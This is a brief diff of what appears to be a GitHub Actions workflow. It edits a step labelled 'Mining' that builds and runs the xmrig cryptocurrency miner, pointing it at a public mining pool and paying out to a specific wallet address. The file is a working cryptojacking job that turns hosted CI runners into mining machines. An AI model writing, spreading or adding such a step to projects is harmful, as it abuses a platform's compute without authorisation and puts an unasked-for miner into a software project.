@@ -22,4 +22,5 @@ jobs:
 
       - name: Mining
         run: |
+          cd xmrig/build
           ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x
